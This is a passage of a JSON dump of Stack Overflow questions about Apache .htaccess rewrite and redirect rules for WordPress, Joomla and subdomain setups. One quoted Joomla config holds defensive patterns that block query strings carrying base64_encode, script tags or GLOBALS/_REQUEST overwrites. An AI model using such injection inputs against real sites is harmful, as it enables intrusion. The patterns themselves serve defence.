this:</p>\n\n<p>232 The+Pillar+of+Autumn+LASO</p>\n\n<p>And finally, I have my rewrite rule:</p>\n\n<p>RewriteRule ^ch([0-9]{1,4})(/)?$ <a href=\"http://reachchallenges.infectionist.com/challenge/\" rel=\"nofollow\">http://reachchallenges.infectionist.com/challenge/</a>$1/${hrci:$1} [R=301,L]</p>\n\n<p>So visiting the path <code>ch232</code> should redirect to <code>/challenge/232/The+Pillar+of+Autumn+LASO</code>, but instead it just redirects to <code>/challenge/232/</code>, no title. What the heck am I doing wrong?!?</p>\n"},{"tags":["php","linux",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13100822,"title":"htacess mod_rewrite subdomain to subdomain","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1698230/using-mod-rewrite-to-redirect-from-subdomain-to-maindomain\">using mod_rewrite to redirect from subdomain to maindomain</a>  </p>\n</blockquote>\n\n\n\n<p>I have an existing subdomain set up on cpanel, which points to a folder in the web root. So, go.example.com points to a php application located at www.example.com/go. Cpanel handles all of this.</p>\n\n<p>At www.example.com/go, I have a .htaccess file as follows, which basically removes the index.php front controller from the url:</p>\n\n<pre><code>DirectoryIndex index.php\nRewriteEngine on\nRewriteCond $1 !^(index\\.php|images|css|js|robots\\.txt|favicon\\.ico)\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ ./index.php/$1 [L,QSA]\n</code></pre>\n\n<p>This all works fine.</p>\n\n<p>However, I now have a requirement to add another subdomain (api.example.com), that points to another folder located at www.example.com/go/api:</p>\n\n<p>Firstly, should api.example.com point to www.example.com/go/api or to go.example.com/api ?\nSecondly, how would I achieve this in the htacess file?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13100016,"title":"Duplicate Content - 301 Redirect Section of Joomla Website Using htaccess","body":"<p>I have a website with a forum and I am trying to clean up duplicate content issues.</p>\n\n<p>What I am trying to do is 301 redirect any URLS with mywebsite.com/recent-topics/category-title/post-title.html to mywebsite.com/forum/category-title/post-title.html.</p>\n\n<p>It is a Joomla website and a htaccess file is already in use. I have added this string to the end of the htaccess file but it's not working:</p>\n\n<pre><code>RewriteRule ^/recent-topics/(.*) /forum [R=301,L]\n</code></pre>\n\n<p>Full htaccess file:</p>\n\n<pre><code>RewriteEngine On\n\nRewriteCond %{QUERY_STRING} base64_encode.*\\(.*\\) [OR]\nRewriteCond %{QUERY_STRING} (\\&lt;|%3C).*script.*(\\&gt;|%3E) [NC,OR]\nRewriteCond %{QUERY_STRING} GLOBALS(=|\\[|\\%[0-9A-Z]{0,2}) [OR]\nRewriteCond %{QUERY_STRING} _REQUEST(=|\\[|\\%[0-9A-Z]{0,2})\nRewriteRule ^(.*)$ index.php [F,L]\n\n##\n# Uncomment following line if your webserver's URL\n# is not directly related to physical file paths.\n# Update Your Joomla! Directory (just / for root).\n##\n\n#RewriteBase /\n\n## Begin - Joomla! core SEF Section.\n#\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} !^/index.php\nRewriteCond %{REQUEST_URI} (/component/) [OR]\nRewriteCond %{REQUEST_URI} (/|\\.php|\\.html|\\.htm|\\.feed|\\.pdf|\\.raw|/[^.]*)$  [NC]\nRewriteRule (.*) index.php\nRewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization},L]\n#\n## End - Joomla! core SEF Section.\n\nRewriteRule ^/recent-topics/(.*) /forum [R=301,L]\n</code></pre>\n\n<p>Can anyone offer any advice as to what I am doing wrong?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13100171,"title":"allow domain only for certain extensions with hatccess","body":"<p>I have a domain abc.com</p>\n\n<p>with subdomains</p>\n\n<pre><code>abc.com\nwww.abc.com\nimg.abc.com\n</code></pre>\n\n<p>All pointing to the same folder on my server.</p>\n\n<p>Since I intend to use img.abc.com as a cdn, need to prevent img.abc.com/pqr.html from being a duplicate of www.abc.com/pqr.html.</p>\n\n<p>ie</p>\n\n<pre><code>abc.com/* should redirect to www.abc.com/*\nimg.abc.com/*.jpg/gif/png should be allowed\n[img.abc.com/*.other extension] should be redirected to [www.abc.com/*.other extension]\n</code></pre>\n\n<p>What could be the possible htaccess rules to be included?</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":131,"score":0,"question_id":13089197,"title":"The page contains too many server redirects?","body":"<p>I am trying to redirect android/Iphone/Ipad users to a different web address(subdomain) but everytime it redirects on my tablet it pops up with 'The page contains too many server redirects' ?? my htaccess code on the server is as follows > </p>\n\n<pre><code>Options -MultiViews +FollowSymLinks\nRewriteEngine On\n\nRewriteCond %{HTTP_USER_AGENT} \"android|blackberry|ipad|iphone|ipod|iemobile|opera mobile|palmos|webos|googlebot-mobile\" [NC]\nRewriteCond %{HTTP_HOST} !^eco-fireplaces.co.uk/mob.html\nRewriteRule ^(.*)$ http://m.eco-fireplaces.co.uk/mob.html[R=307,L,NC]\n</code></pre>\n\n<p>this redirects my android device to <code>http://m.eco-fireplaces.co.uk/mob.html%5bR=307,L,NC%5d</code></p>\n\n<p>but comes up with the 'The page contains too many server redirects' ?? error</p>\n\n<p>Can someone help me fix this please.</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting","xampp"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":334,"score":2,"question_id":11243975,"title":"Rewriting URL with .htaccess local in XAMPP","body":"<p>My .htacces begins with</p>\n\n<pre><code>   RewriteEngine on\n   RewriteBase /\n</code></pre>\n\n<p>(I tried it also without RewriteBase...)</p>\n\n<p>I tried all of the following rewriting rules to rewrite the URL</p>\n\n<p><strong>index.php?page=news</strong></p>\n\n<p>to</p>\n\n<p><strong>/blog</strong></p>\n\n<ul>\n<li>RewriteRule ^/?([-A-Za-z0-9]+)/([-A-Za-z0-9]+)/blog$\nindex.php?page=$1 [L]  </li>\n<li>RewriteRule ^([^/]*)/blog$ /sites/blog/index.php?page=$1 [L]</li>\n<li>RewriteRule ([a-zA-z]+)/([a-zA-z]+)/blog$ index.php?page=$1 [L]</li>\n</ul>\n\n<p>Nothing works - no error. Mod_rewrite is installed and working. I restarted Apache and MySQL everytime I changed something in my .htaccess.</p>\n\n<p>I also want to change my URLs which looks like this... <strong>index.php?page=single_news&amp;category=release&amp;id=9&amp;headline=Beastie%20Boys%20III</strong></p>\n\n<p>...into: <strong>blog/release/9-Beastie-Boys-III</strong></p>\n\n<p>I am lost. Hope you can help me.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13087146,"title":"How to combine RewriteCond in htaccess","body":"<p>I am looking for <code>If, else</code> type of code which can combine my re-write rules based on host/domain name. So if domain name is \"domainA\" then redirect a to b, c to d and if domain name is \"domainB\" then redirect x to y and z to p. Basically I don't want to write the Condition again and again as I have done below:</p>\n\n<p>I have written following code for htaccess</p>\n\n<pre><code>    RewriteCond %{HTTP_HOST} ^domain\\.com$ [OR]\n    RewriteCond %{HTTP_HOST} ^www\\.domain\\.com$\n    RewriteRule ^home /? [L,R=301]\n\n    RewriteCond %{HTTP_HOST} ^domain\\.com$ [OR]\n    RewriteCond %{HTTP_HOST} ^www\\.domain\\.com$\n    RewriteRule ^home-old /? [L,R=301]\n</code></pre>\n\n<p>In above I am using host because I have multiple domains pointed to same hosting space so htaccess is common between all. </p>\n\n<p>Can I combine the above multiple condition for a domain into one, instead of writing domai name again and again for some set of redirects for specific domain?</p>\n\n<p>Please advise, thanks!</p>\n"},{"tags":["apache",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13092977,"title":"htaccess not working if put in sub directory","body":"<p>Apache wont load my .htaccess file in my alias directory.</p>\n\n<p>if i put the .htaccess file in my root folder (D:/Development) and project folder (D:/Development/code/project), </p>\n\n<p><code>http://localhost/filename.html</code>\nredirects me to stackoverflow.</p>\n\n<p><code>http://localhost/project/filename.html</code>\n returns not found 404.</p>\n\n<p>I'm running xampp on windows 7 64 bit.</p>\n\n<p>Why cant i use my .htaccess in my sub directory?</p>\n\n<p>httpd.conf:</p>\n\n<pre><code>&lt;Directory /&gt;\n    Options +FollowSymLinks\n    AllowOverride All\n    Order allow,deny\n    Deny from all\n&lt;/Directory&gt;\n&lt;Directory \"D:/Development\"&gt;\n    Options +Indexes +FollowSymLinks +Includes +ExecCGI\n    AllowOverride All\n    Order allow,deny\n    Allow from all\n&lt;/Directory&gt;\n</code></pre>\n\n<p>httpd-vhosts.conf:</p>\n\n<pre><code> Alias /project \"D:/Development/code/project/\"\n &lt;Directory \"D:/Development/code/project/\"&gt;\n    Options +FollowSymLinks\n    AllowOverride All\n    Order allow,deny\n    Allow from all\n&lt;/Directory&gt;\n</code></pre>\n\n<p>.htaccess (redirect is for testing):</p>\n\n<pre><code>redirect 301 /filename.html http://stackoverflow.com\nAddDefaultCharset utf-8\nRewriteEngine ON\nRewriteRule ^(stylesheet|images|favicon) - [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\n\nRewriteRule ^.*$ /index.php [NC,L]\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite","get","trailing-slash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":13082468,"title":"htaccess mod_rewrite redirect directory paths with no trailing slash to PHP GET","body":"<p>I am building an ajax-driven website that uses html5 pushState() to preserve its url structure and facilitate reliable page reloads, etc. For this,I have set up my htaccess in such a way that any directory path that begins with an uppercase letter and has no trailing slash is redirected to some </p>\n\n<p>\"domain.com/index.php?page=Directorypath\"</p>\n\n<p>So right now my requests are translated as:</p>\n\n<p>domain.com/Folder  =>  domain.com/index.php?page=Folder</p>\n\n<p>domain.com/Folder/ , domain.com/folder, domain.com/folder/ => (default, no rewrite)</p>\n\n<p>This is done by my .htaccess file (located at domain root) and has the code :</p>\n\n<pre><code># Enable Rewriting\nRewriteEngine on\nRewriteBase /\nRewriteCond %{REQUEST_URI} ^((/?[A-Z][A-Za-z0-9]*)+[^/])$\nRewriteRule ^((/?[A-Z][A-Za-z0-9]*)+[^/])$ index.php?page=$1\n</code></pre>\n\n<p>This worked fine until I added a blank directory named \"Folder\" and visited \"domain.com/Folder\" on my browser.<br>\nPreviously, \"domain.com/Folder\" was giving me the expected content (\"domain.com/index.php?page=Folder\") and \"domain.com/Folder/\" was giving me a 404 error, as expected since there was no directory named \"Folder\" in the document root.</p>\n\n<p>Now my expected result was:<br>\nBrowser shows \"domain.com/Folder\" in the url bar and server delivers the content of \"domain.com/index.php?page=Folder\" (same as the case when \"Folder\" did not exist)</p>\n\n<p>But instead:<br>\nBrowser shows \"domain.com/Folder?page=Folder\"</p>\n\n<p>Can someone point out what I am doing wrong over here? And, if possible, how I could correct it?</p>\n\n<p>*I have no other htaccess files in any other directory.<br>\nEdit: <strong>the scheme seems to be working fine when I force a permanent redirect [R=301], but unfortunately that changes the url in browser's address bar.</strong></p>\n"},{"tags":["php","wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13097468,"title":"weird automatic wp redirection","body":"<p>When I type the url address of my website <strong>with www</strong> for example <a href=\"http://www.mayumibeats.com/question\" rel=\"nofollow\">http://www.mayumibeats.com/question</a> it would redirect me to my homepage which is <a href=\"http://mayumibeats.com/\" rel=\"nofollow\">http://mayumibeats.com/</a> but when i type it <strong>without www</strong> on it for example <a href=\"http://mayumibeats.com/question\" rel=\"nofollow\">http://mayumibeats.com/question</a> it just works fine. \nWhat am I missing here?</p>\n\n<p>Here is my .httaccess</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\n\n# uploaded files\nRewriteRule ^([_0-9a-zA-Z-]+/)?files/(.+) wp-includes/ms-files.php?file=$2 [L]\n\n# add a trailing slash to /wp-admin\nRewriteRule ^([_0-9a-zA-Z-]+/)?wp-admin$ $1wp-admin/ [R=301,L]\n\nRewriteCond %{REQUEST_FILENAME} -f [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^ - [L]\nRewriteRule  ^[_0-9a-zA-Z-]+/(wp-(content|admin|includes).*) $1 [L]\nRewriteRule  ^[_0-9a-zA-Z-]+/(.*\\.php)$ $1 [L]\nRewriteRule . index.php [L]\n</code></pre>\n\n<p><strong>NOTE:</strong> The site is wpmu</p>\n"},{"tags":["php","wordpress",".htaccess","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13092373,"title":"Remove part of URL","body":"<p>I have head to move a shop over from Zen cart to Wordpress Woocommerce but the companies site has  been optimised for SEO and is listed well and they already have links throughout google.</p>\n\n<p>The original site had the following url structure</p>\n\n<p>www.mysite.co.uk/{category-name}  &amp;  www.mysite.co.uk/{category-name}/{product-name}</p>\n\n<p>the wordpress/woocommerce url looks like this</p>\n\n<p>www.mysite.co.uk/product-category/{category-name}  &amp;</p>\n\n<p>www.mysite.co.uk/product/{category-name}/{product-name}</p>\n\n<p>I need to remove 'product-category' and 'product'. </p>\n\n<p>at the moment I do not care how convoluted the solution is and it does not need to maintain this structure for future added categories only for categories already listed on google.</p>\n\n<p>I do hope this makes seance and would appreciate any help.</p>\n"},{"tags":[".htaccess","multilanguage","multiple-domains"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":13043270,"title":".htaccess - Multiple domains to the same root folder - multiple languages","body":"<p>I have multiple domains pointed to the same root folder.</p>\n\n<p>the website are multilingual. Language is setup by a session variable </p>\n\n<p>I have <strong>www.domain.com/index.php?lang=en (default)</strong></p>\n\n<p><strong>www.domain.com/index.php?lang=da (danish)</strong></p>\n\n<p>also I have www.domain.dk</p>\n\n<p>How cam I point <strong>www.domain.dk</strong> to <strong>www.domain.dk/index.php?land=da</strong></p>\n\n<p>The URL I want to remain as it is :</p>\n\n<ol>\n<li><p>if .com -> url: -> http:www.domain.com</p></li>\n<li><p>if .dk -> url: -> http:www.domain.dk</p></li>\n</ol>\n\n<p>Thank you</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect","http-status-code-301"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":107,"score":0,"question_id":7512880,"title":"301 Redirect, mod_rewrite disabled","body":"<p>if mod_rewrite disabled, is there <em>any</em> other way to redirect a domain to another one?</p>\n\n<p>Using htaccess too or any other way.</p>\n"},{"tags":["drupal",".htaccess","drupal-7"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":3412,"score":1,"question_id":5716839,"title":"How to remove /drupal from URL in Drupal 7 when installation is in the associated sub-directory","body":"<p>In Drupal 6 I was able to successful install Drupal in a subdirectory called drupal and then reference the site without having to use example.com/drupal.\nIn Drupal 6 to get this to work I did the following:\n- Created an .htaccess file in the root directory where /drupal was created. The file contents was:</p>\n\n<pre><code>Options -Indexes\nRewriteEngine On\nRewriteRule ^$ drupal/\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ drupal/$1\n</code></pre>\n\n<p>Updated the <code>drupal/sites/default/settings.php</code> file to have the $base_url defined as:\n<code>$base_url = 'http://example.com';</code></p>\n\n<p>When I try and do the same thing for Drupal 7, only the front page can be displayed, all the pages fail quite horribly (or only display the front page). I have also tried uncommenting the RewriteBase lines in /drupal/.htaccess. First I tried <code>RewriteBase /drupal</code> and then tried <code>RewriteBase /</code>. But both attempts failed. I never needed to do this with D6, but I thought I would rule out this possible fix.</p>\n\n<p>I am currently testing the new Drupal 7 install using xampp (version 1.7.4) with the example.com site under htdocs (i.e. xampp/htdocs/example.com/drupal). The Drupal 6 site is within the same xampp installation, but of course with a different directory path (e.g. xampp/htdocs/d6example.com/drupal). Note that I also have the Drupal 6 installation running on a production server with only the $base_url variable value changed.</p>\n\n<p>So, how can you install Drupal 7 in a subdirectory and then run it from that directory without having the directory name in the URL?\nNote I am installing Drupal 7 in a subdirectory as it allows for easier upgrading between new releases of the Drupal 7 core.</p>\n"},{"tags":[".htaccess","url-rewriting","subdomain"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13097510,"title":"Rewriting Virtual Subdomain via .htaccess to get request","body":"<p>I am currently working on a multicity based classified ads website. I would like to implement a virtual subdomain system where all request to a subdomain like:</p>\n\n<pre><code>somecity.mywebsite.com/somefolder/\n</code></pre>\n\n<p>gets rewritten to:</p>\n\n<pre><code>mywebsite.com/somefolder/?city=somecity\n</code></pre>\n\n<p>This should happen for all request except these two subdomains:</p>\n\n<pre><code>www.mywebsite.com\nbeta.mywebsite.com\n</code></pre>\n\n<p>I would like the rewritten url to still retain all get parameters supplied with the original url.</p>\n\n<p>What is the best approach to doing this on shared hosting and what are the pros and cons?</p>\n"},{"tags":["wordpress",".htaccess","redirect","permalinks"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13094656,"title":"Wordpress permalink redirect rule","body":"<p>Running into a little bit of an issue with Wordpress permalink redirects that I was hoping I could get some help with.</p>\n\n<p>Previously, I utilized the following permalink structure for my blog posts:</p>\n\n<pre><code>/blog/%year%/%monthnum%/ %day%/%postname%/\n</code></pre>\n\n<p>I've recently changed it to:</p>\n\n<pre><code>/blog/%postname%/\n</code></pre>\n\n<p>Problem is, none of my old links which were structured using the old format now work!</p>\n\n<p>I know it's possible to write a general .htaccess 301 redirect rule, but besides knowing that it's possible, I don't actually know how to do it.</p>\n\n<p>Any tips?</p>\n"},{"tags":["wordpress","apache",".htaccess","url-rewriting","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13086223,"title":"Wordpress Multisite (subdomain install) rewrite rules","body":"<p>1) I have a Wordpress multisite subdomain installation with about 100 sites in the network. </p>\n\n<p>Network Admin - Sites (All Sites) shows them like this: </p>\n\n<pre><code>main site: \"www.domain-name.com\"\nall other sites: \"subdomain-name.domain-name.com\"\n</code></pre>\n\n<p>there is also a domain mapping plugin, so they all get access as separate urls: </p>\n\n<pre><code>domain-name1.com\ndomain-name2.com\n...\ndomain-name100.com\n</code></pre>\n\n<p>2) Currently urls on all blogs are set to: </p>\n\n<pre><code>domain-name.com/2012/10/26/post-name\ndomain-name.com/category/category-name\n</code></pre>\n\n<p>(I used today's date as an example)</p>\n\n<p>This is also the way domains show in Google and Bing search results</p>\n\n<p>3) I am going to remove \"2012/10/26/\" and \"category/\" from the urls, so they are gonna look like this: </p>\n\n<pre><code>domain-name.com/post-name\ndomain-name.com/category-name\n</code></pre>\n\n<p>...and I need to have a rewrite rule that takes care of redirecting people coming from serps to these new urls</p>\n\n<p>4) I have something like this right now:</p>\n\n<pre><code>RewriteRule ^([0-9]{4})/([0-9]{2})/([0-9]{2})/(.*)$ http://domain.com/$4 [L,R=301]\n\nRewriteCond %{HTTP_HOST} ^domain\\.com\nRewriteRule ^([0-9]{4})/([0-9]{2})/([0-9]{2})/(.*)$ http://domain.com/$4 [L,R=301]\n</code></pre>\n\n<p>but I am not sure if it is correct / if it is gonna work right, and also I need to have a rule for all 100 websites, and not just one. These versions (only one of them was meant to be used) dont include the \"category/\" part either. </p>\n\n<p>5) If somebody would have an idea how to do that it would be great (one or two  rewrite rules for all sites would be probably best). </p>\n\n<p>Thank you in advance for any info. </p>\n"},{"tags":["wordpress",".htaccess","redirect","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13096612,"title":"htaccess rewrite (old domain to new domain both www and non-www)","body":"<p>I am attempting to do redirect an old domain (regardless of whether it has a www prefix) to a new domain without the www.  e.g.:</p>\n\n<p>olddomain.com > newdomain.com</p>\n\n<p>www.olddomain.com > newdomain.com</p>\n\n<p>I've got it so that the redirects from non-www are working, but the if www is used, the domain does not redirect.</p>\n\n<p>This is on a Wordpress site, so I'm including the bits that Wordpress uses, too.</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\n\n# ### Begin custom domain redirect ###\nRewriteCond %{HTTP_HOST} ^www\\.olddomain.com\\.com$ [NC]\nRewriteRule ^.*$ http://newdomain.com%{REQUEST_URI} [R=301,L]\nRewriteCond %{HTTP_HOST} ^olddomain\\.com$ [NC]\nRewriteRule ^.*$ http://newdomain.com%{REQUEST_URI} [R=301,L]\n# ### End custom domain redirect, back to the standard WP stuff ###\n\nRewriteRule ^/index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n</code></pre>\n"},{"tags":[".htaccess","redirect","http-redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13095934,"title":"Multipart htaccess redirect","body":"<p>Hey guys I'm having a bit of trouble getting my htaccess to redirect properly and was hoping for some help.</p>\n\n<p>I'm expecting <code>DEV-domain.com?CampID=AB12345</code> to redirect to \n<code>http://DEV-www.domain.com/landing/external-marketing/direct-mail/AB?CampId=AB12345</code></p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^DEV-(www\\.)?domain\\.com [NC]\nRewriteCond %{QUERY_STRING} ^CampID=\nRewriteRule (\\w{2})(\\w{5})$ http://DEV-www\\.domain\\.com/landing/external-marketing/direct-mail/$1?CampId=$1$2 [R=301,L]\n</code></pre>\n\n<p>Unfortunetly I can't get it working for some reason?</p>\n"},{"tags":[".htaccess","rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13092744,"title":"htaccess clutter within subdirectories, hide php, force www and no duplicates throughout site","body":"<p>I need some help with my htaccess file. I want to hide all .php extensions on my website throughout all directories.  Also would like to force \"www\" rather than no \"www\". and my last issue is that I cannot have 2 pages for www.mywebsite.com/index and www.mywebsite.com/ .. basically needs to 301 and Im having the same issue within my subdirectories. I ran a Google sitemap and it noticed index.php and www.domain.com/about/ as two separate pages which I know is bad for SEO... I have everything working the way I want right now but have to place htaccess files in each directory of the root to replace all .php's and not show index of folders.. </p>\n\n<p>Is there any way I can do this from the root htaccess without things being such a mess?</p>\n\n<p><strong>Current Root .htaccess</strong></p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\nRewriteBase /\nRewriteCond %{THE_REQUEST} ^.*\\/index\\.php\\ HTTP/\nRewriteRule ^(.*)index\\.php$ http://www.mydomain.com/$1 [R=301,L]\n\nRewriteEngine on\nRewriteBase /\nRewriteCond %{THE_REQUEST} ^.*\\/index\\ HTTP/\nRewriteRule ^(.*)index\\.php$ http://www.mydomain.com/$1 [R=301,L]\n\nOptions +FollowSymlinks\nRewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteRule ^(.+)$ /$1.php\n\nRewriteCond %{HTTP_HOST}   ^mydomain.com/ [NC]\nRewriteRule ^(.*)      http://www.mydomain.com/$1 [R=301,NC]\n</code></pre>\n\n<p><strong>As an example of sub-directory .htaccess I am using...</strong></p>\n\n<pre><code>Options +FollowSymLinks -MultiViews\n# Turn mod_rewrite on\nRewriteEngine On\nRewriteBase /\n\n## hide .php extension\n# To externally redirect /dir/foo.php to /dir/foo\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,}\\s([^.]+)\\.php [NC]\nRewriteRule ^ %1 [R=301,NC,L]\n\n## To internally redirect /dir/foo to /dir/foo.php\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteRule ^ %{REQUEST_URI}.php [L]\n\nRewriteEngine on\nRewriteBase /\nRewriteCond %{THE_REQUEST} ^.*\\/index\\ HTTP/\nRewriteRule ^(.*)index\\.php$ http://www.mydomain.com/about/$1 [R=301,L]\n\n\nRewriteEngine On\nRewriteCond %{HTTP_HOST} ^mydomain.com/about/$ [NC]\nRewriteRule ^(.*)$ http://www.mydomain.com/about/$1 [R=301,NC,L]\n</code></pre>\n\n<p>Is there a way to combine all of these rules in just the root? Please help :(</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13095805,"title":"Reoccurring htaccess command","body":"<p>I need to continue this indefinatly in length without writing it out everytime.\nIs there a way to achieve this?</p>\n\n<pre><code>RewriteRule   ^(\\w+)/?$   index.php?page=$1 [QSA]\nRewriteRule   ^(\\w+)/(\\w+)/?$   index.php?page=$1&amp;$1=$2 [QSA,L]\nRewriteRule   ^(\\w+)/(\\w+)/(\\w+)/?$   index.php?page=$1&amp;$1=$2&amp;$2=$3 [QSA,L]\n</code></pre>\n\n<p>So all the way through $1=$2 then $2=$3 so page=blog&amp;blog=article&amp;article=date&amp;date=2012</p>\n\n<p>My PHP then takes this and runs analysis on this. So could be as as $1 -> $11 Long URL I know means that I can still enable adding.</p>\n\n<pre><code>AAA.com/blog/article/date/2012/?colour=blue\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":13,"score":1,"question_id":13094981,"title":"Moving blog to subdomain","body":"<p>So I have tried to implement some solutions to my dilemma but they have all partially failed.  </p>\n\n<p>I have moved my blog from www.website.com/blog/ to blog.website.com</p>\n\n<p>blog.website.com is in a directory outside of my root web directory</p>\n\n<p>All urls are identical after the initial location: for example...\nold site  www.website.com/blog/wp-admin   =    blog.website.com/wp-admin</p>\n\n<p>This is a wordpress site if that helps or makes a difference.</p>\n\n<p>This is what I have for now.  Redirects main folder but not subfolders...</p>\n\n<pre><code>RewriteEngine on\nRewriteBase / \n\n#if not already blog.website.com\nRewriteCond %{HTTP_HOST} !^blog\\.website\\.com$ [NC] \n#if request is for blog/, go to blog.website.com\nRewriteRule ^blog/$ http://blog.website.com/$1 [L,NC,R=301] \n</code></pre>\n"},{"tags":["apache",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":17,"score":1,"question_id":13093851,"title":"redirect download directory to subdomain","body":"<p>my download script structure is:</p>\n\n<pre><code>http://www.mysite.com/download/viewdownload/**/**\n</code></pre>\n\n<p>now i want move and redirect to subdomain </p>\n\n<p>for example</p>\n\n<p>redirect</p>\n\n<pre><code>http://www.mysite.com/download/viewdownload/61/4249\n to\nhttp://www.alt.mysite.com/download/viewdownload/61/4249\n</code></pre>\n\n<p>or</p>\n\n<pre><code>http://www.mysite.com/download/viewdownload/53/824\n to\nhttp://www.alt.mysite.com/download/viewdownload/53/824\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":3721,"score":0,"question_id":5373334,"title":"500 Internal Server Error when using .htaccess with RewriteEngine","body":"<p>I am on the shared host <a href=\"http://bounceweb.com\" rel=\"nofollow\">Bounceweb</a> and I am trying to add some rewrite rules to make my links look prettier.</p>\n\n<p>One of these rules is to make the url: <code>http://mysite.com/upload</code> point to: <code>http://mysite.com/upload.php</code>. I have this in my .htaccess file:</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^upload$ upload.php\n</code></pre>\n\n<p>but all it's giving me is a 500 Internal Server Error. I looked at my logs and this comes up a lot:</p>\n\n<pre><code>[alert] [client 81.179.29.185] /home/minecraf/public_html/.htaccess: Invalid command '\\xef\\xbb\\xbfRewriteEngine', perhaps misspelled or defined by a module not included in the server configuration\n</code></pre>\n\n<p>Does this mean my host doesn't support .htaccess? Pretty lame if they don't. I've already tried changing the permissions of .htaccess to 777 and it doesn't help.</p>\n\n<p>Thanks!</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13085265,"title":"Tricky: Remap url but stay on the same url internally","body":"<p>Need your help. Just spend many ours on this htaccess problem and still don't have a clue how to manage this.</p>\n\n<p>I have many <a href=\"http://www.example.com/menu-alias/foo\" rel=\"nofollow\">http://www.example.com/menu-alias/foo</a> links on my company's website which should get redirected to <a href=\"http://www.example.com/foo\" rel=\"nofollow\">http://www.example.com/foo</a>.</p>\n\n<p>This alone shouldn't be the hard part but listen up... the tricky part follows.</p>\n\n<p>I don't manage to get the site (Joomla 1.5) working without the 'menu-alias' this means that all <a href=\"http://www.example.com/foo\" rel=\"nofollow\">http://www.example.com/foo</a> should get internally mapped to <a href=\"http://www.example.com/menu-alias/foo\" rel=\"nofollow\">http://www.example.com/menu-alias/foo</a>. So that the user still has <a href=\"http://www.example.com/foo\" rel=\"nofollow\">http://www.example.com/foo</a> in his browser's address bar.</p>\n\n<p>To make it even more complicated i have to 301 redirect the old menu-alias/foo links to /foo.</p>\n\n<p>Can some htaccess guru help me out? Is this even possible?</p>\n"},{"tags":["php",".htaccess","pagination"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":57,"score":2,"question_id":13079574,"title":"Pagination and htaccess","body":"<p>I am looking for some help 